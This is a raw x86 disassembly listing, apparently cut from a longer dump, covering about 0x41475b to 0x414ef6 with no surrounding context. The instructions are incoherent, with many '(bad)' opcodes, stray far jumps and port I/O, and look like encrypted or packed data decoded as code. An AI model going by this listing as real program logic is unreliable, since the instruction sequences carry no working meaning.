  41475b:	jge    0x41470f
  41475d:	dec    eax
  41475e:	dec    ecx
  41475f:	xchg   DWORD PTR ds:0xfe68ea22,eax
  414765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414766:	mov    edx,ecx
  414768:	fucomp st(0)
  41476a:	and    DWORD PTR [ebx+edx*4-0x45da49d7],0x3c75e831
  414775:	mov    edi,DWORD PTR [eax]
  414777:	push   ss
  414778:	and    edi,DWORD PTR [ebx+0x1c]
  41477b:	sub    eax,0x80081ebc
  414780:	mov    eax,ds:0xd86c5056
  414785:	jae    0x414804
  414787:	add    eax,0x3894c05
  41478c:	sub    DWORD PTR [edi-0x80],esi
  41478f:	jbe    0x414809
  414791:	jp     0x4147ea
  414793:	stc    
  414794:	scas   eax,DWORD PTR es:[edi]
  414795:	icebp  
  414796:	jmp    DWORD PTR [edi]
  414798:	sbb    cl,cl
  41479a:	inc    ebp
  41479b:	int    0xca
  41479d:	rcl    DWORD PTR [ebx+edx*8+0x27],1
  4147a1:	mov    ?,WORD PTR [ecx+0x76c346a5]
  4147a7:	(bad)  
  4147a8:	sub    BYTE PTR [ebp-0x29733c6e],ch
  4147ae:	sub    ecx,edi
  4147b0:	bound  edx,QWORD PTR [ecx-0x5f]
  4147b3:	ja     0x414738
  4147b5:	cmp    dh,bh
  4147b7:	xor    edi,DWORD PTR [ecx]
  4147b9:	jae    0x414781
  4147bb:	pusha  
  4147bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147bd:	fs jne 0x414749
  4147c0:	cmc    
  4147c1:	cdq    
  4147c2:	das    
  4147c3:	cmovae edx,DWORD PTR [ebx]
  4147c6:	int3   
  4147c7:	adc    edi,DWORD PTR [eax+0x7a14615]
  4147cd:	fwait
  4147ce:	jne    0x414827
  4147d0:	or     BYTE PTR fs:[ebp+0x68a8273c],0x7b
  4147d8:	ins    DWORD PTR es:[edi],dx
  4147d9:	or     DWORD PTR [edx+ebx*8],esp
  4147dc:	xchg   BYTE PTR [edi-0x9],dh
  4147df:	xchg   ebp,eax
  4147e0:	ret    
  4147e1:	shl    edx,cl
  4147e3:	cs fxam 
  4147e6:	fdivrp st(5),st
  4147e8:	adc    esp,esp
  4147ea:	imul   eax,DWORD PTR cs:[ecx+esi*4-0x4],0x22
  4147f0:	scas   eax,DWORD PTR es:[edi]
  4147f1:	sub    BYTE PTR [edx+0x6850ed36],bl
  4147f7:	fist   WORD PTR [ecx+0x7a]
  4147fa:	adc    ecx,esp
  4147fc:	aad    0xfd
  4147fe:	fld    TBYTE PTR [edx]
  414800:	lock rcl BYTE PTR [eax+0x69],0xa4
  414805:	addr16 ja 0x41484f
  414808:	push   ecx
  414809:	icebp  
  41480a:	(bad)  
  41480b:	call   0xe05fe2e0
  414810:	cmp    BYTE PTR [ebx-0x21],0x72
  414814:	adc    ebx,DWORD PTR [esi-0x41]
  414817:	repz sbb eax,DWORD PTR [edx+0x7]
  41481b:	sbb    DWORD PTR [eax-0x1e],0x1fa83a72
  414822:	mov    cl,0x6b
  414824:	adc    al,BYTE PTR cs:[edi+0x2946ec3e]
  41482b:	aaa    
  41482c:	mov    eax,0xc9b90d73
  414831:	daa    
  414832:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  414834:	pop    ebx
  414835:	mov    cl,0x99
  414837:	pop    ebx
  414838:	retf   
  414839:	cmp    ebp,esp
  41483b:	add    al,0xe5
  41483d:	ror    DWORD PTR [eax+edi*4+0x77a07ca9],1
  414844:	in     eax,0x76
  414846:	(bad)  
  414847:	ror    eax,cl
  414849:	adc    DWORD PTR [edi+0x7e],edi
  41484c:	shr    BYTE PTR [eax-0xdb5ebdb],1
  414852:	inc    esp
  414853:	mov    ch,BYTE PTR [ebp+0x58200bba]
  414859:	add    DWORD PTR [edx-0x23],0x56
  41485d:	dec    ecx
  41485e:	je     0x4148da
  414860:	stos   BYTE PTR es:[edi],al
  414861:	dec    eax
  414862:	sbb    ebx,ebx
  414864:	sub    eax,0x9cb6598e
  414869:	in     eax,dx
  41486a:	iret   
  41486b:	jnp    0x414881
  41486d:	fcomip st,st(3)
  41486f:	aaa    
  414870:	push   cs
  414871:	sahf   
  414872:	jmp    0x414814
  414874:	mov    edx,0xdb567cba
  414879:	cwde   
  41487a:	push   esp
  41487b:	jl     0x414828
  41487d:	mov    bh,0xe6
  41487f:	(bad)
  414883:	sub    bh,al
  414885:	leave  
  414886:	retf   
  414887:	sub    al,0xf2
  414889:	test   al,0x2e
  41488b:	icebp  
  41488c:	xchg   edi,eax
  41488d:	sbb    BYTE PTR [eax+0x3df717a1],dl
  414893:	frstor [ecx-0x79]
  414896:	mov    DWORD PTR [esi+0x220870da],edi
  41489c:	push   0x5a59b5e4
  4148a1:	icebp  
  4148a2:	dec    eax
  4148a3:	lods   al,BYTE PTR ds:[esi]
  4148a4:	mov    bl,0xf6
  4148a6:	mov    ch,al
  4148a8:	mov    dh,0x61
  4148aa:	and    DWORD PTR [bp+0x5e],ebx
  4148ae:	push   esp
  4148af:	mov    bh,0x26
  4148b1:	mov    eax,0x5d281efb
  4148b6:	ror    BYTE PTR [esi],1
  4148b8:	pop    esi
  4148b9:	fistp  DWORD PTR [esi]
  4148bb:	test   eax,0xd0e3b0f0
  4148c0:	in     eax,dx
  4148c1:	nop
  4148c2:	repz inc ebx
  4148c4:	and    eax,0xb6ff3efd
  4148c9:	cmp    BYTE PTR [eax+ebp*2],ch
  4148cc:	pop    esp
  4148cd:	jl     0x41486d
  4148cf:	jp     0x41492c
  4148d1:	ins    BYTE PTR es:[edi],dx
  4148d2:	xchg   edx,eax
  4148d3:	mov    ecx,0xc1b29524
  4148d8:	ret    
  4148d9:	mov    ebx,0xf6bdb036
  4148de:	xchg   BYTE PTR [ecx],bl
  4148e0:	pop    ebp
  4148e1:	test   DWORD PTR [ebx+0x51346678],edi
  4148e7:	fst    DWORD PTR [edi]
  4148e9:	loopne 0x414893
  4148eb:	or     al,0x75
  4148ed:	stos   BYTE PTR es:[edi],al
  4148ee:	icebp  
  4148ef:	cmp    eax,0x62a2b46
  4148f4:	push   es
  4148f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148f6:	cmp    al,0xda
  4148f8:	push   es
  4148f9:	sub    bl,cl
  4148fb:	adc    BYTE PTR [edi+0x46baee20],bl
  414901:	and    eax,0x409749fb
  414906:	enter  0xc06f,0x5c
  41490a:	scas   eax,DWORD PTR es:[edi]
  41490b:	mov    cl,0xc9
  41490d:	inc    ebx
  41490e:	test   DWORD PTR [edi+0x799b34d0],ebp
  414914:	inc    ebp
  414915:	in     eax,0xb8
  414917:	push   ebx
  414918:	jno    0x4148b6
  41491a:	xchg   ebp,eax
  41491b:	mov    ds:0x1fdff5a4,al
  414920:	push   es
  414921:	shl    DWORD PTR [eax+0x223cf3e1],0x59
  414928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414929:	repnz pushf 
  41492b:	(bad)  
  41492e:	out    0x18,al
  414930:	repz inc ebx
  414932:	push   ecx
  414933:	ins    BYTE PTR es:[edi],dx
  414934:	mov    esp,0x414a6740
  414939:	mov    bl,0x85
  41493b:	mov    ebx,0x44999dc7
  414940:	adc    BYTE PTR [esi+0x22],ch
  414943:	cs out dx,eax
  414945:	sbb    cl,BYTE PTR [eax]
  414947:	cmp    BYTE PTR [edi],ah
  414949:	call   0x92dd49e1
  41494e:	cmp    ebx,0xc302d42e
  414954:	cdq    
  414955:	inc    edx
  414956:	popa   
  414957:	push   0xc62fa033
  41495c:	and    esp,esp
  41495e:	sub    BYTE PTR [edi-0x21],dl
  414961:	jmp    0x14ea4586
  414966:	neg    eax
  414968:	add    esi,DWORD PTR [ecx-0x283468c5]
  41496e:	paddq  mm3,QWORD PTR [ebp+0x2eca60ea]
  414975:	call   0xd7ff833c
  41497a:	cmp    al,0xb8
  41497c:	out    0x29,eax
  41497e:	mov    ebx,0xca657a82
  414983:	pop    ecx
  414984:	xchg   esi,eax
  414985:	jp     0x414965
  414987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414988:	inc    esi
  414989:	call   0xd9c8:0x47c9db8f
  414990:	pop    edx
  414991:	dec    esi
  414992:	sub    BYTE PTR [ebp+0xb],0xe9
  414996:	clc    
  414997:	sub    BYTE PTR [esi],al
  414999:	(bad)  
  41499a:	add    bl,bh
  41499c:	push   ecx
  41499d:	and    BYTE PTR [ecx+0x41],ch
  4149a0:	test   DWORD PTR ds:0x1fec3f85,ecx
  4149a6:	(bad)  
  4149a7:	and    cl,BYTE PTR [ebp-0x78]
  4149aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149ab:	and    edx,ebx
  4149ad:	sub    bl,BYTE PTR [ebx]
  4149af:	add    eax,0xb5a4606c
  4149b4:	or     BYTE PTR [edi-0x149d9591],dh
  4149ba:	xor    BYTE PTR [eax-0x7d239532],0x67
  4149c1:	dec    edi
  4149c2:	js     0x414981
  4149c4:	xor    esp,DWORD PTR [eax+0x3f7ece06]
  4149ca:	mov    ds:0x6142033c,al
  4149cf:	xor    al,0x76
  4149d1:	aaa    
  4149d2:	sub    DWORD PTR [edi],ecx
  4149d4:	xchg   esp,eax
  4149d5:	stos   BYTE PTR es:[edi],al
  4149d6:	push   ebx
  4149d7:	push   0x47
  4149d9:	mov    eax,0xe7c6445f
  4149de:	pop    edx
  4149df:	pusha  
  4149e0:	outs   dx,BYTE PTR ds:[esi]
  4149e1:	stos   DWORD PTR es:[edi],eax
  4149e2:	inc    esp
  4149e3:	inc    esi
  4149e4:	inc    esi
  4149e5:	push   eax
  4149e6:	mov    ebp,0x916912db
  4149eb:	out    dx,eax
  4149ec:	(bad)  
  4149ed:	lods   eax,DWORD PTR ds:[esi]
  4149ee:	dec    ebp
  4149ef:	pop    ds
  4149f0:	xchg   ebp,eax
  4149f1:	inc    esp
  4149f2:	inc    ebp
  4149f3:	push   ds
  4149f4:	mov    esp,0x32d28147
  4149f9:	out    dx,al
  4149fa:	adc    al,dl
  4149fc:	jle    0x414a33
  4149fe:	ja     0x414a6e
  414a00:	jbe    0x4149fd
  414a02:	add    dh,BYTE PTR [esi+0x4d90d9c9]
  414a08:	and    BYTE PTR [ecx-0x6d],bh
  414a0b:	dec    edi
  414a0c:	fwait
  414a0d:	push   ds
  414a0e:	cmp    DWORD PTR ss:[ebx-0x182b334a],ebx
  414a15:	jge    0x4149af
  414a17:	hlt    
  414a18:	mov    ebx,0xdbd65638
  414a1d:	mov    eax,0xb4d0c589
  414a22:	mov    ebx,0x7419255d
  414a27:	dec    esp
  414a28:	adc    al,0xdc
  414a2a:	xor    eax,0x7416f7f2
  414a2f:	sbb    al,0x99
  414a31:	push   esp
  414a32:	pop    edi
  414a33:	(bad)  
  414a34:	push   ebp
  414a35:	sub    DWORD PTR [esi+edi*4+0x5f508b58],ebx
  414a3c:	stc    
  414a3d:	xor    ah,cl
  414a3f:	dec    ebx
  414a40:	or     al,0x9f
  414a42:	test   BYTE PTR [di-0x2b],0x7a
  414a47:	retf   0x2646
  414a4a:	popa   
  414a4b:	clc    
  414a4c:	mov    ebp,DWORD PTR [ecx+0x31]
  414a4f:	loopne 0x4149ea
  414a51:	or     al,BYTE PTR [esi-0x5]
  414a54:	push   ds
  414a55:	pop    ebp
  414a56:	dec    ecx
  414a57:	mov    cl,0x29
  414a59:	test   eax,0x98fe888c
  414a5e:	outs   dx,DWORD PTR ds:[esi]
  414a5f:	arpl   WORD PTR [esi],cx
  414a61:	xchg   esp,eax
  414a62:	mov    bh,0x49
  414a64:	test   eax,0xc9d7c6f6
  414a69:	out    dx,eax
  414a6a:	jg     0x414a55
  414a6c:	jne    0x414a9c
  414a6e:	dec    esi
  414a6f:	data16 lahf 
  414a71:	mov    BYTE PTR [edi-0x15],al
  414a74:	jle    0x414a7a
  414a76:	loop   0x414a87
  414a78:	mov    edi,DWORD PTR [ecx+0x7f]
  414a7b:	inc    ebp
  414a7c:	es dec ebp
  414a7e:	cmp    eax,0xa636d518
  414a83:	fs mov al,0xab
  414a86:	add    DWORD PTR [esi+0x611d60c1],0x31
  414a8d:	or     BYTE PTR [edi-0xe],dl
  414a90:	repnz scas al,BYTE PTR es:[edi]
  414a92:	sbb    dl,BYTE PTR [eax]
  414a94:	in     eax,dx
  414a95:	and    ch,BYTE PTR [edx]
  414a97:	cmp    ecx,DWORD PTR [edi+0x61]
  414a9a:	in     al,0xcf
  414a9c:	inc    ebx
  414a9d:	retf   
  414a9e:	or     cl,BYTE PTR [esi-0x49]
  414aa1:	xchg   BYTE PTR [esi+0x3a9285da],dh
  414aa7:	pop    ecx
  414aa8:	mov    edi,0xc0f1a308
  414aad:	sahf   
  414aae:	loop   0x414b0e
  414ab0:	inc    ecx
  414ab1:	ins    BYTE PTR es:[edi],dx
  414ab2:	std    
  414ab3:	xchg   edi,eax
  414ab4:	xchg   ebp,eax
  414ab5:	imul   edi,DWORD PTR [ecx+0x1b],0xb6ba7d47
  414abc:	repnz inc ebx
  414abe:	pop    eax
  414abf:	popf   
  414ac0:	mov    cl,0x2c
  414ac2:	inc    edi
  414ac3:	std    
  414ac4:	(bad)  
  414ac5:	(bad)  
  414ac6:	fld    st(0)
  414ac8:	sbb    cl,ch
  414aca:	mov    bh,0x6c
  414acc:	jno    0x414afd
  414ace:	mov    DWORD PTR [eax+0x6e],esi
  414ad1:	loopne 0x414a71
  414ad3:	and    BYTE PTR [esi+eiz*1-0x3d7c84af],ch
  414ada:	sbb    al,0xf8
  414adc:	or     eax,0x8b370ef4
  414ae1:	sbb    al,0xa0
  414ae3:	push   edx
  414ae4:	pop    edx
  414ae5:	cmp    dl,BYTE PTR [ebx-0x12]
  414ae8:	xchg   esi,eax
  414ae9:	aad    0x23
  414aeb:	push   edi
  414aec:	mov    cl,0xbe
  414aee:	ins    DWORD PTR es:[edi],dx
  414aef:	add    edi,DWORD PTR [eax-0x62]
  414af2:	(bad)  
  414af3:	fs xchg cx,ax
  414af6:	addr16 iret 
  414af8:	popf   
  414af9:	dec    esi
  414afa:	lahf   
  414afb:	(bad)  
  414afc:	fist   WORD PTR [ebx+esi*2]
  414aff:	adc    dh,BYTE PTR [ebx-0x5f]
  414b02:	out    dx,al
  414b03:	aaa    
  414b04:	pusha  
  414b05:	push   ds
  414b06:	int    0x46
  414b08:	addr16 in eax,0x34
  414b0b:	push   es
  414b0c:	mov    eax,0x46282500
  414b11:	push   0x5b8679b1
  414b16:	sbb    cl,BYTE PTR [esi]
  414b18:	jmp    0x414b16
  414b1a:	mov    eax,0xe37a16e0
  414b1f:	mov    ds:0x67fcc967,al
  414b24:	mov    dh,0x51
  414b26:	mov    al,0x73
  414b28:	add    bh,BYTE PTR [eax-0x15ad1d49]
  414b2e:	mov    cl,0x8c
  414b30:	pushf  
  414b31:	out    0xd8,al
  414b33:	std    
  414b34:	sbb    DWORD PTR [ecx],0xffffff9a
  414b37:	mov    bh,0x6f
  414b39:	mov    eax,DWORD PTR [ebx-0x76fde185]
  414b3f:	sub    al,0x6f
  414b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b42:	enter  0x4bae,0x74
  414b46:	addr16 add eax,0x10efc1ce
  414b4c:	lods   eax,DWORD PTR ds:[esi]
  414b4d:	jmp    0x4572:0x55a2f010
  414b54:	bound  eax,QWORD PTR [ebx-0x49]
  414b57:	sub    dh,BYTE PTR [ecx-0x3476fc44]
  414b5d:	and    BYTE PTR [esi-0x62],0x83
  414b61:	in     eax,0x9
  414b63:	std    
  414b64:	or     BYTE PTR [esi],al
  414b66:	mov    DWORD PTR [ebx],esp
  414b68:	dec    edi
  414b69:	mov    edx,0xcae8d299
  414b6e:	adc    eax,0xe0da2db3
  414b73:	add    edi,DWORD PTR [ecx-0x5f7ccf6c]
  414b79:	or     esi,ebp
  414b7b:	leave  
  414b7c:	or     eax,0x3860e5b5
  414b81:	fbstp  TBYTE PTR [esi-0x49]
  414b84:	add    BYTE PTR [edi],0x80
  414b87:	dec    ebx
  414b88:	imul   edx,DWORD PTR [eax-0x60],0xffffffbb
  414b8c:	xlat   BYTE PTR ds:[ebx]
  414b8d:	pop    eax
  414b8e:	int    0x6b
  414b90:	jns    0x414b43
  414b92:	inc    eax
  414b93:	sbb    eax,0xda32cb99
  414b98:	dec    edx
  414b99:	inc    eax
  414b9a:	outs   dx,BYTE PTR ds:[esi]
  414b9b:	nop
  414b9c:	lods   al,BYTE PTR ds:[esi]
  414b9d:	fst    QWORD PTR [edi]
  414b9f:	nop
  414ba0:	push   edi
  414ba1:	sbb    eax,0x7773e995
  414ba6:	das    
  414ba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ba8:	mov    BYTE PTR [ecx],bh
  414baa:	or     ecx,DWORD PTR [eax+0x6d]
  414bad:	pop    ebp
  414bae:	aad    0x6b
  414bb0:	cli    
  414bb1:	inc    ebp
  414bb2:	shl    BYTE PTR [eax-0x2aae6c24],0xca
  414bb9:	or     esi,ebp
  414bbb:	(bad)
  414bbf:	xchg   ebx,eax
  414bc0:	jl     0x414b47
  414bc2:	cmp    ebp,edi
  414bc4:	jp     0x414c3e
  414bc6:	mov    esi,0x1912ea92
  414bcb:	adc    DWORD PTR [edi-0x4d],esi
  414bce:	es push 0x7a
  414bd1:	inc    ecx
  414bd2:	retf   0xcfba
  414bd5:	out    dx,eax
  414bd6:	pop    edi
  414bd7:	mov    edx,0x80edb91b
  414bdc:	test   eax,0xf8ad7a5d
  414be1:	fnstcw WORD PTR [edx-0x18]
  414be4:	adc    al,0x33
  414be6:	ins    DWORD PTR es:[edi],dx
  414be7:	push   edx
  414be8:	pop    ss
  414be9:	in     eax,0xa3
  414beb:	cmp    esi,esp
  414bed:	mov    esp,DWORD PTR [edx+0x51]
  414bf0:	mov    eax,0x49e6fbc4
  414bf5:	or     eax,0x3af15eec
  414bfa:	inc    ebx
  414bfb:	or     DWORD PTR [esi+esi*8+0x28],ebx
  414bff:	xchg   DWORD PTR [eax],ebx
  414c01:	dec    ebp
  414c02:	fbld   TBYTE PTR [esp+eiz*4-0x66bb8698]
  414c09:	in     al,dx
  414c0a:	cdq    
  414c0b:	test   al,0xdf
  414c0d:	shr    ebp,cl
  414c0f:	(bad)  
  414c10:	adc    ecx,ecx
  414c12:	fadd   st,st(0)
  414c14:	dec    edi
  414c15:	sub    ah,BYTE PTR [esi+ecx*1+0x2a1dddb0]
  414c1c:	or     esp,DWORD PTR [eax+0x4c]
  414c1f:	dec    edx
  414c20:	jmp    0x9018:0x92b7c6df
  414c27:	and    BYTE PTR [esi+ebp*1-0x27],bl
  414c2b:	add    ebx,DWORD PTR [edx+0x4fa6bb33]
  414c31:	xor    eax,0xa2900e41
  414c36:	fidiv  DWORD PTR [ebp+0x71a55e5f]
  414c3c:	aad    0x1a
  414c3e:	push   es
  414c3f:	int3   
  414c40:	mov    al,0x56
  414c42:	in     al,dx
  414c43:	ret    0xc869
  414c46:	xchg   DWORD PTR [ecx],esp
  414c48:	xlat   BYTE PTR ds:[ebx]
  414c49:	push   0x4f1b9c11
  414c4e:	push   esp
  414c4f:	iret   
  414c50:	dec    esi
  414c51:	ret    0xdac
  414c54:	sti    
  414c55:	mov    dl,BYTE PTR [ebp+0x2f529d65]
  414c5b:	aam    0xc6
  414c5d:	stos   DWORD PTR es:[edi],eax
  414c5e:	mov    dl,0x6d
  414c60:	jmp    0x9847:0xbfb5729c
  414c67:	and    al,BYTE PTR [ebx-0x16db93b9]
  414c6d:	jae    0x414c3d
  414c6f:	cwde   
  414c70:	addr16 cli 
  414c72:	mov    cl,0x2
  414c74:	shl    DWORD PTR [eax-0x17],1
  414c77:	push   DWORD PTR [eax]
  414c79:	jp     0x414c3c
  414c7b:	xor    al,0x5f
  414c7d:	inc    esp
  414c7e:	into   
  414c7f:	pop    edi
  414c80:	ret    0xf703
  414c83:	outs   dx,DWORD PTR ds:[esi]
  414c84:	xchg   BYTE PTR [eax],dh
  414c86:	pop    esp
  414c87:	mov    ecx,0x880e1ba2
  414c8c:	pop    edi
  414c8d:	xchg   edi,eax
  414c8e:	mov    dl,0x15
  414c90:	test   DWORD PTR [ebx-0x1bd0a0ef],eax
  414c96:	ror    BYTE PTR [edx],cl
  414c98:	aam    0x9a
  414c9a:	cwde   
  414c9b:	xchg   DWORD PTR [eax+0x46a541c3],ebp
  414ca1:	in     al,0x7f
  414ca3:	data16 cmp BYTE PTR [ebx+0x3d],dl
  414ca7:	aam    0x8a
  414ca9:	retf   
  414caa:	xor    ch,BYTE PTR [eax+0x373c5949]
  414cb0:	jl     0x414c48
  414cb2:	dec    ecx
  414cb3:	ins    BYTE PTR es:[edi],dx
  414cb4:	cmp    eax,0x646ef6cd
  414cb9:	in     eax,0x78
  414cbb:	xor    al,0x9
  414cbd:	push   ebp
  414cbe:	and    BYTE PTR [eax+eiz*8+0xf],0xb6
  414cc3:	lahf   
  414cc4:	std    
  414cc5:	shl    BYTE PTR [edx+0x62],0xe3
  414cc9:	jno    0x414d34
  414ccb:	gs push edx
  414ccd:	icebp  
  414cce:	stos   DWORD PTR es:[edi],eax
  414ccf:	popa   
  414cd0:	xchg   DWORD PTR [ebx-0x23a2c802],edi
  414cd6:	imul   ebp,DWORD PTR [ebp-0x41d76244],0xea2880d8
  414ce0:	cmp    eax,DWORD PTR [ebx]
  414ce2:	(bad)  
  414ce3:	sub    al,0x71
  414ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ce6:	(bad)  
  414ce8:	cs mov edi,0x5c78f64a
  414cee:	mov    ah,0x14
  414cf0:	jmp    0xdab2:0x635f4bd4
  414cf7:	push   ebx
  414cf8:	in     al,dx
  414cf9:	push   0x25214e81
  414cfe:	dec    ecx
  414cff:	mov    al,0x4
  414d01:	push   0x17
  414d03:	std    
  414d04:	sub    ah,BYTE PTR [ebp+0x6d]
  414d07:	inc    ecx
  414d08:	ins    BYTE PTR es:[edi],dx
  414d09:	loope  0x414cd5
  414d0b:	ds add eax,0x4c320e7e
  414d11:	(bad)  
  414d13:	inc    eax
  414d14:	mov    WORD PTR [ecx-0x5b547dd1],?
  414d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d1b:	les    ebx,FWORD PTR [ebp-0x131f2c1c]
  414d21:	xor    al,0xff
  414d23:	pop    ss
  414d24:	fwait
  414d25:	data16 xor bh,BYTE PTR [ecx+0x3e]
  414d29:	inc    esi
  414d2a:	jno    0x414d2e
  414d2c:	adc    al,0xb
  414d2e:	and    esi,DWORD PTR gs:[edi+esi*1]
  414d32:	adc    dh,dl
  414d34:	retf   
  414d35:	sub    al,0xd6
  414d37:	jle    0x414d6d
  414d39:	sub    esi,DWORD PTR [esi]
  414d3b:	sub    BYTE PTR [ecx+0x7263e9a6],bh
  414d41:	dec    edx
  414d42:	lahf   
  414d43:	ret    0x868a
  414d46:	test   bh,dl
  414d48:	sub    eax,0x68f046e1
  414d4d:	icebp  
  414d4e:	xchg   ebx,eax
  414d4f:	sub    DWORD PTR [edx],eax
  414d51:	adc    esi,DWORD PTR [ecx+0x53]
  414d54:	adc    BYTE PTR [ebx+0x48],bl
  414d57:	pop    edx
  414d58:	or     eax,0xf18561f8
  414d5d:	mov    dh,0xce
  414d5f:	mov    ch,0xe3
  414d61:	xchg   esp,eax
  414d62:	mov    ecx,DWORD PTR [esi+esi*2]
  414d65:	mov    esp,0x540a68b1
  414d6a:	mov    ah,0x95
  414d6c:	push   esp
  414d6d:	dec    esi
  414d6e:	popa   
  414d6f:	mov    eax,0xd4ed2541
  414d74:	fstp   DWORD PTR [edx+0xde332c0]
  414d7a:	(bad)  
  414d7b:	je     0x414dc0
  414d7d:	add    al,0x4c
  414d7f:	sub    BYTE PTR [ebx],dl
  414d81:	ss adc eax,ebp
  414d84:	or     ecx,DWORD PTR [ebp+esi*8+0x13]
  414d88:	push   es
  414d89:	xchg   ecx,eax
  414d8a:	sub    ebp,DWORD PTR [eax+eiz*4]
  414d8d:	sub    al,0x5b
  414d8f:	imul   ebx,ebp,0x27
  414d92:	push   ecx
  414d93:	cmp    al,0x2
  414d95:	retf   
  414d96:	adc    BYTE PTR ds:0xd88c7a82,al
  414d9c:	mov    edi,0xbdf4461
  414da1:	mov    edi,0x5ac1862
  414da6:	fdiv   DWORD PTR [edx+0x5]
  414da9:	dec    esp
  414daa:	iret   
  414dab:	jbe    0x414dad
  414dad:	mov    ds:0xd5a495ae,al
  414db2:	inc    esi
  414db3:	leave  
  414db4:	ror    DWORD PTR [eax-0x8],0x4b
  414db8:	aad    0x1f
  414dba:	push   ebx
  414dbb:	xchg   esi,eax
  414dbc:	jp     0x414d81
  414dbe:	fs dec ecx
  414dc0:	jp     0x414d5f
  414dc2:	leave  
  414dc3:	nop
  414dc4:	xlat   BYTE PTR ds:[ebx]
  414dc5:	xor    bh,cl
  414dc7:	or     al,BYTE PTR [edi+ecx*2]
  414dca:	push   eax
  414dcb:	addr16 fs jb 0x414dac
  414dcf:	clc    
  414dd0:	dec    esi
  414dd1:	stc    
  414dd2:	and    al,0xb9
  414dd4:	push   es
  414dd5:	(bad)  
  414dd6:	adc    DWORD PTR [ebp-0x4],ebx
  414dd9:	cmp    DWORD PTR [eax],ebx
  414ddb:	jge    0x414e40
  414ddd:	cmp    eax,0xc28498a6
  414de2:	stos   BYTE PTR es:[edi],al
  414de3:	sub    al,0x37
  414de5:	imul   eax,DWORD PTR [eax+0x74d78cd4],0xe0d259ad
  414def:	xor    cl,ch
  414df1:	shr    ch,cl
  414df3:	pop    ss
  414df4:	mov    ds:0xb440f1c7,eax
  414df9:	out    dx,al
  414dfa:	mov    al,0xea
  414dfc:	test   eax,0x601941ca
  414e01:	(bad)  
  414e02:	sub    al,0x4c
  414e04:	test   al,0x5d
  414e06:	fwait
  414e07:	lock (bad) 
  414e09:	sub    eax,0x39d67fc
  414e0e:	or     dh,BYTE PTR [edx-0x61]
  414e11:	fucomip st,st(3)
  414e13:	retf   
  414e14:	push   ds
  414e15:	and    eax,0xa08ac262
  414e1a:	and    DWORD PTR [edx],ebp
  414e1c:	(bad)  
  414e1d:	xor    al,0xdf
  414e1f:	call   0xc50f:0x5dc74b08
  414e26:	and    DWORD PTR [ecx-0x48],esp
  414e29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e2a:	push   eax
  414e2b:	sbb    ebx,DWORD PTR [edx-0x4679399d]
  414e31:	push   eax
  414e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e33:	cmp    BYTE PTR [ebp+0x6c],dh
  414e36:	sbb    BYTE PTR [esp+ebx*8],ah
  414e39:	(bad)  
  414e3a:	push   0xffffffb2
  414e3c:	enter  0x19c3,0xf0
  414e40:	retf   0x815c
  414e43:	sbb    dh,BYTE PTR [esi]
  414e45:	and    eax,esi
  414e47:	sub    BYTE PTR [ebp-0xb],dl
  414e4a:	idiv   BYTE PTR ss:[edi+edi*1-0x22]
  414e4f:	int3   
  414e50:	mov    ch,0x42
  414e52:	mov    ss,WORD PTR [ebx-0x26b9dc0e]
  414e58:	pop    ebx
  414e59:	dec    eax
  414e5a:	fld    QWORD PTR [ebx-0x19]
  414e5d:	mov    DWORD PTR [esi+ecx*8+0x40],ebx
  414e61:	retf   
  414e62:	std    
  414e63:	test   DWORD PTR [edx],edx
  414e65:	mov    ebp,0xcafa694d
  414e6a:	jp     0x414e30
  414e6c:	jbe    0x414ead
  414e6e:	stc    
  414e6f:	cmovno esp,DWORD PTR [esi+0x21]
  414e73:	or     al,0x69
  414e75:	fs iret 
  414e77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e78:	and    eax,0x98e82584
  414e7d:	mov    esp,0x737b1714
  414e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e83:	pop    esp
  414e84:	fstp   st(1)
  414e86:	cmp    al,0x44
  414e88:	adc    al,0xba
  414e8a:	(bad)  
  414e8b:	das    
  414e8c:	outs   dx,BYTE PTR ds:[esi]
  414e8d:	pusha  
  414e8e:	test   al,0xce
  414e90:	or     eax,0x5f951e18
  414e95:	sub    esp,DWORD PTR [ebx+0x1a62c192]
  414e9b:	cld    
  414e9c:	mov    ah,0xfd
  414e9e:	fucom  st(4)
  414ea0:	pop    ebp
  414ea1:	adc    al,0x47
  414ea3:	inc    ecx
  414ea4:	jl     0x414e27
  414ea6:	mov    dl,0xab
  414ea8:	(bad)  
  414ea9:	mov    ds:0xc1091500,al
  414eae:	adc    al,0xc4
  414eb0:	inc    eax
  414eb1:	adc    DWORD PTR [ebx],ebx
  414eb3:	jnp    0x414eb8
  414eb5:	repz xor al,0x1e
  414eb8:	popa   
  414eb9:	in     eax,dx
  414eba:	push   ss
  414ebb:	aaa    
  414ebc:	mov    ebp,ebp
  414ebe:	mov    es,esi
  414ec0:	cmp    eax,0x2c49bbf8
  414ec5:	leave  
  414ec6:	adc    DWORD PTR gs:[eax],ecx
  414ec9:	mov    ecx,0xc141cd6c
  414ece:	jmp    0x32226de0
  414ed3:	imul   ebp,ecx,0xffffffd5
  414ed6:	push   ebp
  414ed7:	bound  edx,QWORD PTR [eax]
  414ed9:	(bad)  
  414eda:	cld    
  414edb:	mov    ecx,0x73d03ade
  414ee0:	cmp    ebx,DWORD PTR ss:[eax]
  414ee3:	pop    ebp
  414ee4:	dec    edi
  414ee5:	rcr    BYTE PTR [edx],1
  414ee7:	xor    dl,BYTE PTR [edx]
  414ee9:	adc    eax,0x945b730f
  414eee:	or     ecx,DWORD PTR [esi]
  414ef0:	retf   
  414ef1:	and    DWORD PTR [ebx],edi
  414ef3:	xchg   ecx,eax
  414ef4:	sub    ecx,edx
  414ef6:	push   0x5dc4d934
